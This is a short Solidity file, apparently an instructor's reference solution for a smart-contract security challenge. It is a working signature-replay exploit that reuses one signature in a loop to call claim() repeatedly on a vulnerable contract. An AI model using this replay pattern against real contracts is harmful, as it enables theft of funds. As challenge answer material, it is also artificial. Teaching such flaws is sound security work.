// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// ⚠️  INSTRUCTOR REFERENCE — keep out of student-facing materials.
import {IVulnerableSigClaim} from "../src/Setup.sol";

contract SolutionRef {
    function replay(
        IVulnerableSigClaim claim,
        address payable to,
        uint256 amount,
        bytes calldata signature,
        uint256 times
    ) external {
        for (uint256 i = 0; i < times; ++i) {
            claim.claim(to, amount, signature);
        }
    }

    receive() external payable {}
}
